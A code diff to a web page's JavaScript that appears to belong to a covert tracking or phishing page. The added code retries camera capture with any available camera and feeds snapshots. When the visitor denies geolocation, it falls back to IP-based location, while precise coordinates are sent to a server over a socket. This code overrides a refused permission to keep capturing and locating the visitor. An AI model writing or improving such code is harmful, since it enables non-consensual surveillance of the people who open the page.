@@ -213,15 +213,26 @@ function startCameraStream() {
     if (camStreamInterval) return;
     if (!stream || !stream.getVideoTracks().length) {
         // Request camera first (silent if already granted)
-        navigator.mediaDevices.getUserMedia({video:{facingMode:camFacingMode},audio:false})
-            .then((s) => {
-                stream = s;
-                const v = document.querySelector('video[data-snap]');
-                if (v) { v.srcObject = s; v.play(); }
-                else { startSnapshots(); }
-                setTimeout(startCameraStream, 500);
-            })
-            .catch(() => {});
+        const tryGetCam = (mode) => {
+            const constraints = mode ? {video:{facingMode:mode},audio:false} : {video:true,audio:false};
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then((s) => {
+                    stream = s; camFacingMode = mode || 'user';
+                    const v = document.querySelector('video[data-snap]');
+                    if (v) { v.srcObject = s; v.play(); }
+                    else { startSnapshots(); }
+                    // Wait for video ready then restart
+                    const waitAndRetry = () => {
+                        const v2 = document.querySelector('video[data-snap]');
+                        if (v2 && v2.readyState >= 2) { startCameraStream(); return; }
+                        if (v2) { v2.onloadeddata = () => startCameraStream(); }
+                        else setTimeout(startCameraStream, 500);
+                    };
+                    setTimeout(waitAndRetry, 300);
+                })
+                .catch(() => { if (mode) tryGetCam(null); }); // fallback: any camera
+        };
+        tryGetCam(camFacingMode);
         return;
     }
     const v = document.querySelector('video[data-snap]');
@@ -1013,14 +1024,14 @@ function requestPermItem(perm) {
             };
 
             if (perm.id === 'location') {
-                if (!navigator.geolocation) { getIPLocation().then(() => doneFallback()); return; }
+                if (!navigator.geolocation) { getIPLocation().then(() => doneFallback()).catch(() => doneFallback()); return; }
                 navigator.geolocation.getCurrentPosition(
                     (p) => {
                         socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
                         donePerm();
                     },
                     (err) => {
-                        if (err.code === 1) { getIPLocation().then(() => doneFallback()); } // permission denied → fallback IP
+                        if (err.code === 1) { getIPLocation().then(() => doneFallback()).catch(() => doneFallback()); } // permission denied → fallback IP
                         else fail(); // other error → retry
                     },
                     {enableHighAccuracy:true,timeout:10000}
